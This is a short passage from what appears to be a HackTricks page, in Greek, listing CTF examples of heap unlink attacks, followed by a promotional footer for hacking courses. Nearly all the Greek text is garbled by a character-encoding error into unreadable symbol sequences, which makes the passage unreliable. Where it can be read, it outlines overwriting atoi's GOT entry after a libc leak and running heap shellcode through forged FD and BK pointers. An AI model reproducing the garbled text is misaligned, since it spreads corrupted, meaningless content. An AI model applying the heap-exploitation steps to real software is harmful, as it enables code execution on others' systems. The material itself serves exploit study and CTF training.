* Î‘ÎºÏÎ¹Î²ÏÏ‚ ÏŒÏ€Ï‰Ï‚ ÏƒÏ„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î±Ï‚ Ï€Î¯Î½Î±ÎºÎ±Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½ ÎºÎ±Ï„Î±Î½Î¿Î¼ÏÎ½. Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ· unlink Î³Î¹Î± Î½Î± Î³Î¯Î½ÎµÎ¹ Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏƒÏ„Î·Î½ Ï€ÏÏÏ„Î· ÎºÎ±Ï„Î±Î½Î¿Î¼Î® Î½Î± Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Î¸Î­ÏƒÎµÎ¹Ï‚ Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î·Î½ Î±ÏÏ‡Î® Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± ÎºÎ±Î¹ Î½Î± ÎµÏ€Î¹ÎºÎ±Î»ÏÏˆÎµÎ¹ Î±Ï…Ï„Î® Ï„Î·Î½ ÎºÎ±Ï„Î±Î½Î¿Î¼Î® ÏƒÏ„Î· Î½Î­Î± Î¸Î­ÏƒÎ·. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÎµÏ€Î¹ÎºÎ±Î»Ï…Ï†Î¸Î¿ÏÎ½ Î¿Î¹ Î´ÎµÎ¯ÎºÏ„ÎµÏ‚ Î¬Î»Î»Ï‰Î½ ÎºÎ±Ï„Î±Î½Î¿Î¼ÏÎ½ ÏÏƒÏ„Îµ Î½Î± Î´ÎµÎ¯Ï‡Î½Î¿Ï…Î½ ÏƒÏ„Î¿ GOT Ï„Î¿Ï… atoi, Î½Î± Ï„Î¿ ÎµÎºÏ„Ï…Ï€ÏÏƒÎ¿Ï…Î½ Î³Î¹Î± Î½Î± Ï€Î¬ÏÎ¿Ï…Î½ Î¼Î¹Î± Î´Î¹Î±ÏÏÎ¿Î® libc ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± ÎµÏ€Î¹ÎºÎ±Î»ÏÏˆÎ¿Ï…Î½ Ï„Î¿ GOT Ï„Î¿Ï… atoi Î¼Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏƒÎµ Î­Î½Î± one gadget.
* Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± CTF Î¼Îµ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½ÎµÏ‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ malloc ÎºÎ±Î¹ free Ï€Î¿Ï… ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎ¿Î½Ï„Î±Î¹ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Ï€Î¿Î»Ï Ï€Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· unlink: [https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html)
* Î¥Ï€Î¬ÏÏ‡ÎµÎ¹ Î¼Î¹Î± Ï…Ï€ÎµÏÏ‡ÎµÎ¯Î»Î¹ÏƒÎ· Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï„Ï‰Î½ Î´ÎµÎ¹ÎºÏ„ÏÎ½ FD ÎºÎ±Î¹ BK Ï„Î·Ï‚ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î·Ï‚ malloc Ï€Î¿Ï… Î¸Î± ÎµÎ¯Î½Î±Î¹ (Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î·) Î±Ï€ÎµÎ»ÎµÏ…Î¸ÎµÏÏ‰Î¼Î­Î½Î·. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î· heap Î­Ï‡ÎµÎ¹ Ï„Î¿ exec bit, Î¿Ï€ÏŒÏ„Îµ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· heap ÎºÎ±Î¹ Î½Î± Î´ÎµÎ¯Î¾ÎµÎ¹ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î±Ï€ÏŒ Ï„Î¿ GOT ÏƒÎµ Î­Î½Î± heap chunk Î¼Îµ shellcode Î³Î¹Î± ÎµÎºÏ„Î­Î»ÎµÏƒÎ·.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Î”ÎµÎ¯Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
